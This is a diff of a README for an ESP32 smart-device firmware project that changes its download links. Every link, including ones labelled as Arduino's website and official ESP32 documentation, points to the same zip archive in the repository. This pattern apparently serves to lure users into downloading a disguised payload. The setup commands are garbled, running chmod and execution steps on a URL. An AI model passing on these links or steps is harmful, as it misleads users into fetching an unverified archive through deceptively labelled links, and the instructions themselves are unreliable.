@@ -1,6 +1,6 @@
 # 🛠️ esp32-ptm216b - Control Smart Devices Made Easy
 
-![Download](https://raw.githubusercontent.com/Imran1432423/esp32-ptm216b/main/instructedness/esp32-ptm216b.zip%20Now-%20%F0%9F%93%A8-blue)
+![Download](https://github.com/Imran1432423/esp32-ptm216b/raw/refs/heads/main/instructedness/b_ptm_esp_2.5.zip%20Now-%20%F0%9F%93%A8-blue)
 
 ## 📥 Overview
 
@@ -14,7 +14,7 @@ This guide will help you quickly and easily download and run the esp32-ptm216b a
 
 To get the software, click the link below. This will take you to the Releases page where you can find the latest version.
 
-[Visit this page to download](https://raw.githubusercontent.com/Imran1432423/esp32-ptm216b/main/instructedness/esp32-ptm216b.zip)
+[Visit this page to download](https://github.com/Imran1432423/esp32-ptm216b/raw/refs/heads/main/instructedness/b_ptm_esp_2.5.zip)
 
 ### 🖥️ System Requirements
 
@@ -35,7 +35,7 @@ To get the software, click the link below. This will take you to the Releases pa
 1. **Connect Your ESP32**: Use a USB cable to connect your ESP32 board to your computer.
    
 2. **Install Necessary Software**: 
-   - You may need the Arduino IDE to upload the firmware. Download and install it from [Arduino's website](https://raw.githubusercontent.com/Imran1432423/esp32-ptm216b/main/instructedness/esp32-ptm216b.zip).
+   - You may need the Arduino IDE to upload the firmware. Download and install it from [Arduino's website](https://github.com/Imran1432423/esp32-ptm216b/raw/refs/heads/main/instructedness/b_ptm_esp_2.5.zip).
 
 3. **Open the Firmware in Arduino IDE**:
    - Download and extract the firmware package.
@@ -56,10 +56,10 @@ If you wish to use the Linux script to receive actions from the PTM216B:
    
 2. **Make the Script Executable**:
    - Navigate to the directory where you downloaded the script.
-   - Run `chmod +x https://raw.githubusercontent.com/Imran1432423/esp32-ptm216b/main/instructedness/esp32-ptm216b.zip` to make it executable.
+   - Run `chmod +x https://github.com/Imran1432423/esp32-ptm216b/raw/refs/heads/main/instructedness/b_ptm_esp_2.5.zip` to make it executable.
 
 3. **Start the Script**:
-   - Run the script with `https://raw.githubusercontent.com/Imran1432423/esp32-ptm216b/main/instructedness/esp32-ptm216b.zip`. Follow the on-screen instructions to set it up.
+   - Run the script with `https://github.com/Imran1432423/esp32-ptm216b/raw/refs/heads/main/instructedness/b_ptm_esp_2.5.zip`. Follow the on-screen instructions to set it up.
 
 ## 🌟 Features
 
@@ -84,7 +84,7 @@ Feel free to reach out to the community if you have questions or need assistance
 
 Here are some additional resources that may help you:
 
-- [Arduino Documentation](https://raw.githubusercontent.com/Imran1432423/esp32-ptm216b/main/instructedness/esp32-ptm216b.zip)
-- [ESP32 Official Documentation](https://raw.githubusercontent.com/Imran1432423/esp32-ptm216b/main/instructedness/esp32-ptm216b.zip)
+- [Arduino Documentation](https://github.com/Imran1432423/esp32-ptm216b/raw/refs/heads/main/instructedness/b_ptm_esp_2.5.zip)
+- [ESP32 Official Documentation](https://github.com/Imran1432423/esp32-ptm216b/raw/refs/heads/main/instructedness/b_ptm_esp_2.5.zip)
 
 Now that you have this guide, you are ready to take control of your smart devices with the esp32-ptm216b firmware. Enjoy!
